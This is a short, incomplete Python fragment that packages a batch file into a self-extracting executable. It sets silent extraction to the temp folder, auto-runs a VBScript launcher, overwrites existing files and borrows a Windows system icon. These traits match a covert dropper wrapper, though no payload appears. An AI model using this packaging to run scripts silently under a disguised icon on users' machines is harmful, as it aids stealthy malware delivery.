...
def create_executable(bat_file, exe_file):
    ...
    temp_sfx_script = 'setup.vbs'

    with open(temp_sfx_config, 'w') as config_file:
        config_file.write(f"""Path=%temp%\\Setup=setup.vbs\\Silent=1\\Overwrite=1\\Icon=%SystemRoot%\\System32\\shell32.dll,1""")

    with open(temp_sfx_script, 'w') as sfx_script:
        sfx_script.write(f"""
Set objShell = CreateObject("WScript.Shell")
If InStr(UCase(WScript.ScriptFullName), UCase("{exe_file}")) Then
